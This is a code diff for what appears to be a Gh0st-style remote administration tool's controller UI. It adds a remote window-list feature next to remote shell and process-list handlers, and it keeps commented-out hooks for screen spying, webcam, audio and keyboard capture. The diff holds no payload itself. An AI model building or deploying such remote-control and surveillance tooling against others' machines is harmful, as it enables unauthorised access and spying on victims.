@@ -14,7 +14,8 @@
 #include "Others/macros.h"
 #include "Others/login.h"
 #include "CShellDlg.h"
-#include "CSystemDlg.h"
+#include "CProcessDlg.h"
+#include "CWindowDlg.h"
 
 //using namespace std;
 
@@ -327,12 +328,14 @@ BEGIN_MESSAGE_MAP(CUIDlg, CDialogEx)
 	ON_MESSAGE(WM_ADDONLINE, &CUIDlg::OnAddOnline)
 	ON_MESSAGE(WM_OPENSHELLDIALOG, &CUIDlg::OnOpenShellDlg)
 	ON_MESSAGE(WM_OPENPSLISTDIALOG, &CUIDlg::OnOpenProcessDialog)
+	ON_MESSAGE(WM_OPENWSLISTDIALOG, &CUIDlg::OnOpenWindowDialog)
 
 	ON_COMMAND(ID_MAIN_SETTING, &CUIDlg::OnMainSetting)
 	ON_COMMAND(ID_MIAN_CLOSE, &CUIDlg::OnMianClose)
 	ON_NOTIFY(NM_RCLICK, IDC_LIST_ONLINE, &CUIDlg::OnNMRClickListOnline)
 	ON_COMMAND(ID_ONLINE_CMD, &CUIDlg::OnOnlineCmd)
-	ON_COMMAND(ID_ONLINE_PROCESS, &CUIDlg::OnProcess)
+	ON_COMMAND(ID_ONLINE_PROCESS, &CUIDlg::OnOnlineProcess)
+	ON_COMMAND(ID_ONLINE_WINDOWS, &CUIDlg::OnOnlineWindows)
 END_MESSAGE_MAP()
 
 
@@ -382,35 +385,39 @@ void CUIDlg::ProcessReceiveComplete(ClientContext *pContext)
 	if (pContext->m_Dialog[0] > 0) {
 		switch (pContext->m_Dialog[0])
 		{
-		case FILEMANAGER_DLG:
-			//((CFileManagerDlg *)dlg)->OnReceiveComplete();
-			break;
+			case FILEMANAGER_DLG:
+				//((CFileManagerDlg *)dlg)->OnReceiveComplete();
+				break;
 
-		case SCREENSPY_DLG:
-			//((CScreenSpyDlg *)dlg)->OnReceiveComplete();
-			break;
-		case WEBCAM_DLG:
-			//((CWebCamDlg *)dlg)->OnReceiveComplete();
-			break;
+			case SCREENSPY_DLG:
+				//((CScreenSpyDlg *)dlg)->OnReceiveComplete();
+				break;
+			case WEBCAM_DLG:
+				//((CWebCamDlg *)dlg)->OnReceiveComplete();
+				break;
 
-		case AUDIO_DLG:
-			//((CAudioDlg *)dlg)->OnReceiveComplete();
-			break;
+			case AUDIO_DLG:
+				//((CAudioDlg *)dlg)->OnReceiveComplete();
+				break;
 
-		case KEYBOARD_DLG:
-			//((CKeyBoardDlg *)dlg)->OnReceiveComplete();
-			break;
+			case KEYBOARD_DLG:
+				//((CKeyBoardDlg *)dlg)->OnReceiveComplete();
+				break;
 
-		case SHELL_DLG:
-			((CShellDlg *)dlg)->OnReceiveComplete();
-			break;
+			case SHELL_DLG:
+				((CShellDlg *)dlg)->OnReceiveComplete();
+				break;
 
-		case PSLIST_DLG:
-			((CSystemDlg *)dlg)->OnReceiveComplete();
-			break;
+			case PSLIST_DLG:
+				((CProcessDlg *)dlg)->OnReceiveComplete();
+				break;
 
-		default:
-			break;
+			case WSLIST_DLG:
+				((CWindowDlg *)dlg)->OnReceiveComplete();
+				break;
+
+			default:
+				break;
 		}
 		return;
 	}
@@ -475,6 +482,10 @@ void CUIDlg::ProcessReceiveComplete(ClientContext *pContext)
 
 	case TOKEN_PSLIST:
 		g_UIDlg->PostMessage(WM_OPENPSLISTDIALOG, 0, (LPARAM)pContext);
+		break;
+
+	case TOKEN_WSLIST:
+		g_UIDlg->PostMessage(WM_OPENWSLISTDIALOG, 0, (LPARAM)pContext);
 		break;
 
 		// 命令停止当前操作
@@ -814,13 +825,28 @@ LRESULT CUIDlg::OnOpenShellDlg(WPARAM wParam, LPARAM lParam)
 LRESULT CUIDlg::OnOpenProcessDialog(WPARAM wParam, LPARAM lParam)
 {
 	ClientContext *pContext = (ClientContext *)lParam;
-	CSystemDlg *dlg = new CSystemDlg(this, g_iocpServer, pContext);
+	CProcessDlg *dlg = new CProcessDlg(this, g_iocpServer, pContext);
 
 	// 非模态方式打开
-	dlg->Create(IDD_DIALOG_SYSTEM, GetDesktopWindow());
+	dlg->Create(IDD_DIALOG_PROCESS, GetDesktopWindow());
 	dlg->ShowWindow(SW_SHOW);
 
 	pContext->m_Dialog[0] = PSLIST_DLG;
+	pContext->m_Dialog[1] = (int)dlg;
+
+	return LRESULT();
+}
+
+LRESULT CUIDlg::OnOpenWindowDialog(WPARAM wParam, LPARAM lParam)
+{
+	ClientContext *pContext = (ClientContext *)lParam;
+	CWindowDlg *dlg = new CWindowDlg(this, g_iocpServer, pContext);
+
+	// 非模态方式打开
+	dlg->Create(IDD_DIALOG_WINDOW, GetDesktopWindow());
+	dlg->ShowWindow(SW_SHOW);
+
+	pContext->m_Dialog[0] = WSLIST_DLG;
 	pContext->m_Dialog[1] = (int)dlg;
 
 	return LRESULT();
@@ -876,8 +902,16 @@ void CUIDlg::OnOnlineCmd()
 
 
 // 进程管理
-void CUIDlg::OnProcess()
+void CUIDlg::OnOnlineProcess()
 {
 	BYTE bToken = COMMAND_PSLIST;
+	SendSelectedToken(&bToken, sizeof(BYTE));
+}
+
+
+// 窗口管理
+void CUIDlg::OnOnlineWindows()
+{
+	BYTE bToken = COMMAND_WSLIST;
 	SendSelectedToken(&bToken, sizeof(BYTE));
 }
